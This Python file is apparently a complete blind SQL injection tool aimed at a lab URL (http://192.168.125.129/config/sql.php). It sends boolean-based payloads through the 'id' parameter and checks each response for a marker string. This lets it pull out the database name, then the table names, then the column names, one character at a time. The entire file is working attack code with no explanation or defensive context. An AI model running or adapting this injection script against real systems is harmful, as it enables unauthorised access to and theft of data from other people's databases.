#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
import urllib
import time
from urllib import parse

start_time = time.time()


def database_length(url):
    values = {}
    for i in range(1, 100):
        values['id'] = "1 and (select length(database()))=%s" % i
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl)
        if response.content.find('qwertyasd') > 0:
            return i


def database_name(url):
    payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
    values = {}
    databasename = ''
    aa = 15
    aa = database_length(url)
    for i in range(1, aa + 1):
        for payload in payloads:
            values['id'] = "1 and ascii(substring(database(),%s,1))=%s " % (i, ord(payload))
            data = urllib.parse.urlencode(values)
            geturl = url + '?' + data
            response = requests.get(geturl)
            if response.content.find('qwertyasd') > 0:
                databasename += payload
    return databasename


# print database_name('http://192.168.125.129/config/sql.php')


def table_count(url, database):
    values = {}
    for i in range(1, 100):
        values[
            'id'] = "1 and (select count(table_name) from information_schema.tables where table_schema=" + "'" + database + "')" + "=%s" % i
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl)
        if response.content.find('qwertyasd') > 0:
            return i


def table_length(url, a, database):
    values = {}
    for i in range(1, 100):
        values[
            'id'] = "1 and (select length(table_name) from information_schema.tables where table_schema=" + "'" + database + "'" + " limit %s,1)=%s" % (
        a, i)
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl)
        if response.content.find('qwertyasd') > 0:
            return i


def table_name(url, database):
    payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
    values = {}
    table_name = []
    bb = table_count(url, database)
    for i in range(0, bb + 1):
        user = ''
        cc = table_length(url, i, database)
        if cc == None:
            break
        for j in range(0, cc + 1):
            for payload in payloads:
                values[
                    'id'] = "1 and ascii(substring((select table_name from information_schema.tables where table_schema=" + "'" + database + "'" + " limit %s,1),%s,1))=%s " % (
                i, j, ord(payload))
                data = urllib.parse.urlencode(values)
                geturl = url + '?' + data
                response = requests.get(geturl)
                if response.content.find('qwertyasd') > 0:
                    user += payload
                    # print payload
        table_name.append(user)
    return table_name


# print table_name('http://192.168.125.129/config/sql.php','test')


def column_count(url, table_name):
    values = {}
    for i in range(1, 100):
        values[
            'id'] = "1 and (select count(column_name) from information_schema.columns where table_name=" + "'" + table_name + "'" + ")=%s" % i
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl)
        if response.content.find('qwertyasd') > 0:
            return i


def column_length(num, url, table_name):
    values = {}
    for i in range(1, 100):
        limit = " limit %s,1)=%s" % (num, i)
        values[
            'id'] = "1 and (select length(column_name) from information_schema.columns where table_name=" + "'" + table_name + "'" + limit
        data = urllib.parse.urlencode(values)
        geturl = url + '?' + data
        response = requests.get(geturl)
        if response.content.find('qwertyasd') > 0:
            return i


def column_name(url, table_name):
    payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
    values = {}
    column_name = []
    dd = column_count(url, table_name)
    for i in range(0, dd + 1):
        user = ''
        bb = column_length(i, url, table_name)
        if bb == None:
            break
        for j in range(0, bb + 1):
            for payload in payloads:
                limit = " limit %s,1),%s,1))=%s" % (i, j, ord(payload))
                values[
                    'id'] = "1 and ascii(substring((select column_name from information_schema.columns where table_name=" + "'" + table_name + "'" + limit
                data = urllib.parse.urlencode(values)
                geturl = url + '?' + data
                response = requests.get(geturl)
                if response.content.find('qwertyasd') > 0:
                    user += payload
        column_name.append(user)
    return column_name


# print column_name('http://192.168.125.129/config/sql.php','admin')


if __name__ == '__main__':
    url = 'http://192.168.125.129/config/sql.php'
    databasename = database_name(url)
    print("The current database:" + databasename)

    database = input("Please input your databasename: ")
    tables = table_name(url, database)
    print(database + " have the tables:",)
    print(tables)

    for table in tables:
        print(table + " have the columns:")
        print(column_name(url, table))
    print('Use for: %d second' % (time.time() - start_time))